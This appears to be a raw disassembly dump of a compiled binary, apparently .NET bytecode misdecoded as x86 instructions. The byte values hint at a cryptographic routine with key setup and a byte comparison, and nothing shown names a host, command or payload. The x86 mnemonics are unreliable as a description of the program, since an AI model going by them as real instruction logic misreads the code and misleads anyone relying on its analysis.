  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 7c             	add    %dh,0x7c(%edx)
  4042d8:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 aa             	add    %dh,-0x56(%edx)
  40436b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	00 27                	add    %ah,(%edi)
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 06    	or     %dl,0x672060d(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 16    	or     %dl,0x1672060d(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
